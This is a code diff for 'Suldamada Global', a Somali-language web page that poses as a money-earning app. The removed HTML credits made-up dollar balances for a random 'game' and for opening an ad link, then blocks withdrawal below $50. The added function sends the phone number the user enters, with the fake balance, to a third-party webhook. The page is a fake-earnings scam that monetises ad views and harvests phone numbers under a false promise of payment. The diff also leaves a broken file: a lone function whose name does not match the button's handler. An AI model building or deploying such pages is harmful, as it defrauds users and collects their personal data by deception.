@@ -1,66 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Suldamada Global</title>
-    <style>
-        body { background: #000; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .app-container { width: 90%; max-width: 400px; background: rgba(20, 20, 20, 0.8); padding: 30px; border-radius: 35px; border: 1px solid #444; backdrop-filter: blur(15px); text-align: center; box-shadow: 0 0 40px rgba(99, 102, 241, 0.2); }
-        .balance-card { background: linear-gradient(135deg, #4f46e5, #ec4899); padding: 30px; border-radius: 25px; margin-bottom: 25px; box-shadow: 0 0 20px rgba(99, 102, 241, 0.4); }
-        .balance-val { font-size: 3rem; font-weight: 800; }
-        .btn { width: 100%; padding: 18px; margin-bottom: 15px; border-radius: 20px; border: none; cursor: pointer; font-weight: bold; color: white; transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.3); }
-        .btn-game { background: #2563eb; }
-        .btn-game:hover { background: #3b82f6; box-shadow: 0 0 20px #3b82f6; }
-        .btn-ad { background: #7c3aed; }
-        .btn-ad:hover { background: #8b5cf6; box-shadow: 0 0 20px #8b5cf6; }
-        .btn-withdraw { background: #059669; }
-        .btn-withdraw:hover { background: #10b981; box-shadow: 0 0 20px #10b981; }
-        input { width: 100%; padding: 18px; margin-bottom: 20px; border-radius: 20px; border: 1px solid #444; background: #111; color: white; text-align: center; box-sizing: border-box; }
-    </style>
-</head>
-<body>
-    <div class="app-container">
-        <h2 style="margin-bottom: 20px;">Suldamada Global</h2>
-        <div class="balance-card">
-            <p style="margin:0; opacity:0.8">Haraagaaga</p>
-            <div class="balance-val">$<span id="balance">32.75</span></div>
-        </div>
-        
-        <button class="btn btn-game" onclick="playGame()">🎮 Play Game & Win $8.50</button>
-        <button class="btn btn-ad" onclick="watchAd()">📺 Watch Ad & Earn $5.50</button>
-        
-        <input type="text" id="phone" placeholder="Geli lambarkaaga">
-        
-        <button class="btn btn-withdraw" onclick="sendWithdraw()">Withdraw Balance</button>
-    </div>
 
-    <script>
-        function playGame() {
-            alert("Ciyaartu way socotaa...");
-            setTimeout(() => {
-                if (Math.random() > 0.6) {
-                    let b = document.getElementById('balance');
-                    b.innerText = (parseFloat(b.innerText) + 8.50).toFixed(2);
-                    alert("Hambalyo! $8.50 ayaa laguugu daray!");
-                } else {
-                    alert("Nasiib xumo! Ciyaartii waa lagaa adkaaday.");
-                }
-            }, 2000);
-        }
-        function watchAd() {
-            window.open("https://omg10.com/4/11075110", "_blank");
-            setTimeout(() => {
-                let b = document.getElementById('balance');
-                b.innerText = (parseFloat(b.innerText) + 5.50).toFixed(2);
-                alert("Waad daawatay! $5.50 ayaa laguugu daray.");
-            }, 10000);
-        }
-        function sendWithdraw() {
-            let b = parseFloat(document.getElementById('balance').innerText);
-            if (b < 50) { alert("Waa inaad gaartaa $50!"); return; }
-            alert("Codsigaaga waa la diray.");
-        }
-    </script>
-</body>
-</html>
+function sendwithdraw() {
+    const phone = document.getElementById('phone').value;
+    const balance = document.getElementById('balance').innerText;
+    
+    fetch('https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: phone, amount: balance })
+    });
+    
+    alert("Waa la diray!");
+}
